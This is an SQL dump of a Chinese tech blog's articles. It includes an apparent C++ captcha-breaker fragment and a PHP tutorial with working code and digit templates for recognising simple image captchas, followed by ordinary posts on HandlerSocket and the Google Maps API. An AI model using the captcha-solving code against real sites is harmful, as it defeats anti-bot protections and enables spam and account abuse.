&amp;nbsp;GdiplusStartup(&amp;amp;GdippToken,&amp;amp;GdippStart,0);&lt;br /&gt;\r\n &amp;nbsp;BSTR bsTemp = sPath.AllocSysString();&lt;br /&gt;\r\n &amp;nbsp;Bitmap&amp;nbsp;&amp;nbsp; bmp(bsTemp);&lt;br /&gt;\r\n &amp;nbsp;::SysFreeString(bsTemp);&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;int&amp;nbsp;&amp;nbsp; FrameCount,FramePos,size,pause;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;PropertyItem*&amp;nbsp;&amp;nbsp; pPropItem;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;GUID&amp;nbsp;&amp;nbsp; pageGuid;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;GUID*&amp;nbsp;&amp;nbsp; pDimID;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;UINT&amp;nbsp;&amp;nbsp; count;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;count=bmp.GetFrameDimensionsCount();&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;pDimID=new GUID[count];&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;bmp.GetFrameDimensionsList(pDimID,count);&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;FrameCount=bmp.GetFrameCount(&amp;amp;pDimID[0]);&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;if (1==FrameCount) //if is bmp then exit&lt;br /&gt;\r\n &amp;nbsp;{&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;delete[]pDimID;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;return FALSE;&lt;br /&gt;\r\n &amp;nbsp;}&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;size=bmp.GetPropertyItemSize(PropertyTagFrameDelay);&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;pPropItem=(PropertyItem*)malloc(size);&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;bmp.GetPropertyItem(PropertyTagFrameDelay,size,pPropItem);&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;delete[]pDimID;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;pageGuid=FrameDimensionTime;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;FramePos=0; &lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;int iFontFramePos = 0;&lt;br /&gt;\r\n &amp;nbsp;int iMaxPause = 0;&lt;br /&gt;\r\n &amp;nbsp;while (FramePos&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;return TRUE;&lt;br /&gt;\r\n }&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;BOOL CCaptchaBreak::GetEncoderClsid(const WCHAR* format, CLSID* pClsid)&lt;br /&gt;\r\n {&lt;br /&gt;\r\n &amp;nbsp;UINT&amp;nbsp; num = 0;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // number of image encoders&lt;br /&gt;\r\n &amp;nbsp;UINT&amp;nbsp; size = 0;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // size of the image encoder array in bytes&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;ImageCodecInfo* pImageCodecInfo = NULL;&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;GetImageEncodersSize(&amp;amp;num, &amp;amp;size);&lt;br /&gt;\r\n &amp;nbsp;if(size == 0)&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;return FALSE;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;pImageCodecInfo = (ImageCodecInfo*)(malloc(size));&lt;br /&gt;\r\n &amp;nbsp;if(pImageCodecInfo == NULL)&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;return FALSE;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;GetImageEncoders(num, size, pImageCodecInfo);&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;for(UINT j = 0; j &amp;lt; num; ++j)&lt;br /&gt;\r\n &amp;nbsp;{&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;{&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;&amp;nbsp;*pClsid = pImageCodecInfo[j].Clsid;&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;&amp;nbsp;free(pImageCodecInfo);&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;&amp;nbsp;return TRUE;&amp;nbsp; // Success&lt;br /&gt;\r\n &amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n &amp;nbsp;}&lt;/span&gt;&lt;/p&gt;\r\n &lt;p&gt;&lt;span style=&quot;font-family:verdana;&quot;&gt;&amp;nbsp;free(pImageCodecInfo);&lt;br /&gt;\r\n &amp;nbsp;return FALSE;&amp;nbsp; &lt;br /&gt;\r\n }&lt;/span&gt;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1301480438, 1, 'admin'),
(9, 1, 'PHP识别验证码原理和样例', 'php 验证码', '', '我们最常见的验证码&lt;br /&gt;\r\n&lt;br /&gt;\r\n1，四位数字，随机的一数字字符串，最原始的验证码，验证作用几乎为零。&lt;br /&gt;\r\n2，随机数字图片验证码。图片上的字符比较中规中矩，有的可能加入一些随机干扰素，还有一些是随机字符颜色，验证作用比上一个好。没有基本图形图像学知识的人，不可破！&lt;br /&gt;\r\n3，各种图片格式的随机数字+随机大写英文字母+随机干扰像素+随机位置。&lt;br /&gt;\r\n4，汉字是注册目前最新的验证码，随机生成，打起来更难了,影响用户体验，所以，一般应用的比较少。&lt;br /&gt;\r\n&lt;br /&gt;\r\n简单起见，我们这次说明的主要对象是第2种类型的，我们先看几种网上比较常见的这种验证码的图片.&lt;br /&gt;\r\n&lt;br /&gt;\r\n这四种样式，基本上能代表2中所提到的验证码类型，初步看起来第一个图片最容易破解，第二个次之，第三个更难,第四个最难。&lt;br /&gt;\r\n真实情况那？其实这三种图片破解难度相同。&lt;br /&gt;\r\n第一个图片，最容易，图片背景和数字都使用相同的颜色，字符规整，字符位置统一。&lt;br /&gt;\r\n第二个图片，看似不容易，其实仔细研究会发现其规则，背景色和干扰素无论怎么变化，验证字符字符规整，颜色相同，所以排除干扰素非常容易，只要是非字符色素全部排除即可。&lt;br /&gt;\r\n第三个图片，看似更复杂，处理上面提到背景色和干扰素一直变化外，验证字符的颜色也在变化，并且各个字符的颜色也各不相同。看似无法突破这个验证码，本篇文章，就一这种类型验证码为例说明，第四个图片，同学们自己搞。&lt;br /&gt;\r\n第四个图片，除了第三个图片上提到的特征外，又在文字上加了两条直线干扰率，看似困难其实，很容易去掉。&lt;br /&gt;\r\n&lt;br /&gt;\r\n验证码识别一般分为以下几个步骤：&lt;br /&gt;\r\n1. 取出字模&lt;br /&gt;\r\n2. 二值化&lt;br /&gt;\r\n3. 计算特征&lt;br /&gt;\r\n4. 对照样本&lt;br /&gt;\r\n&lt;br /&gt;\r\n1：取出字模&lt;br /&gt;\r\n识别验证码，毕竟不是专业的OCR识别，并且，由于各个网站的验证码各不相同，所以，最常见的方法就是就是建立这个验证码的特征码库。去字模时，我们需要多下载几张图片，使这些图片中，包括所有的字符，我们这里的字母只有图片，所以，只要收集到包括0-9的图片即可。&lt;br /&gt;\r\n&lt;br /&gt;\r\n2：二值化&lt;br /&gt;\r\n二值化就是把图片上的验证数字上每个象素用一种数字表示1，其他部分用0表示。这样就可以计算出每个数字字模，记录下这些字模来，当作key即可。&lt;br /&gt;\r\n&lt;br /&gt;\r\n3：计算特征&lt;br /&gt;\r\n把要识别的图片，进行二值化，得到图片特征。&lt;br /&gt;\r\n&lt;br /&gt;\r\n4：对照样本&lt;br /&gt;\r\n把步骤3种的图片特征码和验证码的字模进行对比，得到验证图片上的数字。&lt;br /&gt;\r\n使用目前这种方法，对验证码的识别基本上可以做到100%。&lt;br /&gt;\r\n通过以上步骤，您可能说了，并没有发现如何取出干扰素啊！其实取出干扰素的方法很简单，干扰素的一个重要特征是，不能影响验证码的显示效果，所以制作干扰素时它的RGB可能低于或者高于某个特定值，比如我给的例子中的图片，干扰素的RGB各项值是不会超过125的，所以，这样我们就很容易去掉干扰素了。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\ndefine(''WORD_WIDTH'',9);&lt;br /&gt;\r\ndefine(''WORD_HIGHT'',13);&lt;br /&gt;\r\ndefine(''OFFSET_X'',7);&lt;br /&gt;\r\ndefine(''OFFSET_Y'',3);&lt;br /&gt;\r\ndefine(''WORD_SPACING'',4);&lt;br /&gt;\r\n&lt;br /&gt;\r\nclass valite&lt;br /&gt;\r\n{&lt;br /&gt;\r\n&amp;nbsp; public function setImage($Image)&lt;br /&gt;\r\n&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $this-&amp;gt;ImagePath = $Image;&lt;br /&gt;\r\n&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; public function getData()&lt;br /&gt;\r\n&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return $data;&lt;br /&gt;\r\n&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; public function getResult()&lt;br /&gt;\r\n&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return $DataArray;&lt;br /&gt;\r\n&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; public function getHec()&lt;br /&gt;\r\n&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $res = imagecreatefromjpeg($this-&amp;gt;ImagePath);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $size = getimagesize($this-&amp;gt;ImagePath);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $data = array();&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; for($i=0; $i &amp;lt; $size[1]; ++$i)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; for($j=0; $j &amp;lt; $size[0]; ++$j)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $rgb = imagecolorat($res,$j,$i);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $rgbarray = imagecolorsforindex($res, $rgb);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if($rgbarray[''red''] &amp;lt; 125 || $rgbarray[''green'']&amp;lt;125&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; || $rgbarray[''blue''] &amp;lt; 125)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $data[$i][$j]=1;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }else{&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $data[$i][$j]=0;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $this-&amp;gt;DataArray = $data;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $this-&amp;gt;ImageSize = $size;&lt;br /&gt;\r\n&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; public function run()&lt;br /&gt;\r\n&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $result=&quot;&quot;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; // 查找4个数字&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $data = array(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; for($i=0;$i&amp;lt;4;++$i)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $x = ($i*(WORD_WIDTH+WORD_SPACING))+OFFSET_X;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $y = OFFSET_Y;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; for($h = $y; $h &amp;lt; (OFFSET_Y+WORD_HIGHT); ++ $h)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; for($w = $x; $w &amp;lt; ($x+WORD_WIDTH); ++$w)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $data[$i].=$this-&amp;gt;DataArray[$h][$w];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; // 进行关键字匹配&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; foreach($data as $numKey =&amp;gt; $numString)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $max=0.0;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $num = 0;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; foreach($this-&amp;gt;Keys as $key =&amp;gt; $value)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $percent=0.0;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; similar_text($value, $numString,$percent);&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(intval($percent) &amp;gt; $max)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $max = $percent;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $num = $key;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if(intval($percent) &amp;gt; 95)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; break;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; $result.=$num;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $this-&amp;gt;data = $result;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; // 查找最佳匹配数字&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; return $result;&lt;br /&gt;\r\n&amp;nbsp; }&lt;br /&gt;\r\n&lt;br /&gt;\r\n&amp;nbsp; public function Draw()&lt;br /&gt;\r\n&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; for($i=0; $i&amp;lt;$this-&amp;gt;ImageSize[1]; ++$i)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; for($j=0; $j&amp;lt;$this-&amp;gt;ImageSize[0]; ++$j)&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; echo $this-&amp;gt;DataArray[$i][$j];&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; echo &quot;\\n&quot;;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; public function __construct()&lt;br /&gt;\r\n&amp;nbsp; {&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; $this-&amp;gt;Keys = array(&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''0''=&amp;gt;''000111000011111110011000110110000011110000011110000011110000011110000011110000011110000011011000110011111110000111000'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''1''=&amp;gt;''000111000011111000011111000000011000000011000000011000000011000000011000000011000000011000000011000011111111011111111'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''2''=&amp;gt;''011111000111111100100000110000000111000000110000001100000011000000110000001100000011000000110000000011111110111111110'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''3''=&amp;gt;''011111000111111110100000110000000110000001100011111000011111100000001110000000111000000110100001110111111100011111000'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''4''=&amp;gt;''000001100000011100000011100000111100001101100001101100011001100011001100111111111111111111000001100000001100000001100'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''5''=&amp;gt;&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ''111111110111111110110000000110000000110000000111110000111111100000001110000000111000000110100001110111111100011111000'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''6''=&amp;gt;''000111100001111110011000010011000000110000000110111100111111110111000111110000011110000011011000111011111110000111100'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''7''=&amp;gt;''011111111011111111000000011000000010000000110000001100000001000000011000000010000000110000000110000001100000001100000'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''8''=&amp;gt;''001111100011111110011000110011000110011101110001111100001111100011101110110000011110000011111000111011111110001111100'',&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; ''9''=&amp;gt;''001111000011111110111000111110000011110000011111000111011111111001111011000000011000000110010000110011111100001111000'',&lt;br /&gt;\r\n&amp;nbsp; );&lt;br /&gt;\r\n&amp;nbsp; }&lt;br /&gt;\r\n&amp;nbsp; protected $ImagePath;&lt;br /&gt;\r\n&amp;nbsp; protected $DataArray;&lt;br /&gt;\r\n&amp;nbsp; protected $ImageSize;&lt;br /&gt;\r\n&amp;nbsp; protected $data;&lt;br /&gt;\r\n&amp;nbsp; protected $Keys;&lt;br /&gt;\r\n&amp;nbsp; protected $NumStringArray;&lt;br /&gt;\r\n&lt;br /&gt;\r\n}&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n用法&lt;br /&gt;\r\n&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\ninclude (''Valite.php'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n$valite = new Valite();&lt;br /&gt;\r\n$valite-&amp;gt;setImage(''code.jpeg'');&lt;br /&gt;\r\n$valite-&amp;gt;getHec();&lt;br /&gt;\r\n$ert = $valite-&amp;gt;run();&lt;br /&gt;\r\necho $ert;&lt;br /&gt;\r\necho ''&amp;lt;br&amp;gt;&amp;lt;img src=&quot;code.jpeg&quot;&amp;gt;&amp;lt;br&amp;gt;'';&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n', 1, 1, 0, 0, 1301480878, 1, 'admin'),
(10, 1, 'HandlerSocket插件让MySQL达到了近两倍于memcached的查询性能', 'HandlerSocket,memcached', 'HandlerSocket插件让MySQL达到了近两倍于memcached的查询性能，灰常的牛叉！', '&lt;table style=&quot;width:100%;table-layout:fixed;&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;div id=&quot;blog_text&quot; class=&quot;cnt&quot;&gt;&lt;p&gt;HandlerSocket插件让MySQL达到了近两倍于memcached的查询性能，灰常的牛叉！&lt;/p&gt;\r\n&lt;p&gt;相比常见的memcached+MySQL的架构，MySQL+HandlerSocket架构有两个最明显的优势：&lt;/p&gt;\r\n&lt;strong&gt;节约内存&lt;/strong&gt;：由于MySQL InnoDB本身就会缓存数据，所以没必要在memcached多保存一份。&lt;strong&gt;避免数据不一致性&lt;/strong&gt;：引入memcached后，一个很头痛的问题就是保证数据的一致性。而去掉memcached后，由于所有的数据库操作都是直接达到InnoDB引擎，所以完全消除了此问题。 &lt;p&gt;相对于其他NoSQL解决方案，MySQL+HandlerSocket也有优势：&lt;/p&gt;\r\n&lt;strong&gt;降低应用开发难度&lt;/strong&gt;：由于SQL提供了丰富的查询功能，相当于大多数NoSQL来说，开发应用时更简单。&lt;strong&gt;降低风险&lt;/strong&gt;：NoSQL各有特色，选择不慎会造成深远的影响。而且能够完全掌握NoSQL的技术人员也不够普遍，出了问题不一定能够马上解决。 &lt;p&gt;不过，HandlerSocket虽然省掉了一些步骤，但要是内存不足以缓存大部分常用数据。那么HandlerSocket带来的优势就荡然无存了。因此在使用HandlerSocket时，服务器一定要具备足够的内存空间用于InnoDB的Buffer Pool。此外对PHP开发者来说，HandlerSocket目前还没有可用的PHP扩展。&lt;/p&gt;\r\n&lt;p&gt;作者说他们已经将HandlerSocket用于了生产环境，取得了很好的效果。作者目前就职于日本最大的社会化游戏平台提供商&lt;a href=&quot;http://www.dena.jp/en/index.html&quot; target=&quot;_blank&quot;&gt;DeNA&lt;/a&gt;。&lt;/p&gt;\r\n&lt;p&gt;最后，附上HandelrSocket的仓库地址，这是一个开源项目：&lt;a href=&quot;http://github.com/ahiguti/HandlerSocket-Plugin-for-MySQL&quot; target=&quot;_blank&quot;&gt;http://github.com/ahiguti/HandlerSocket-Plugin-for-MySQL&lt;/a&gt;。&lt;/p&gt;\r\n&lt;/div&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n', 1, 1, 0, 0, 1301495677, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(11, 1, 'Google Map Api 谷歌地图接口整理', '', '', '&lt;div id=&quot;app-share-content&quot;&gt;	                    &lt;p&gt;一：基本知识：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;1. 使用谷歌地图 API 的第一步就是要注册一个 API 密钥，需要注重一下两点：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1.假如使用 API 的页面还没有发布，只是在本地调试，可以不用密钥，随便用个字符串代替就可以了。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2.API 密钥只对网站目录或者域有效。对不同域的网页，需要用这些域分别注册不同的密钥&lt;/p&gt;\r\n&lt;p&gt;2.页面引用javascript文件&amp;lt;script src=&quot;http://ditu.google.com/maps?file=api&amp;amp;hl=zh-CN&amp;amp;v=2&amp;amp;key=abcdefg&quot; type=&quot;text/javascript&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;URL（http://ditu.google.com/maps?file=api&amp;amp;hl=zh-CN&amp;amp;v=2&amp;amp;key=abcdefg）解析：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1.ditu.google.com：也可以用ditu.google.cn，假如你需要在地图上显示大陆以外的具体地图，就用 maps.google.com&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2.file=api 这个是请求API 的JS 文件用的,固定的格式。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 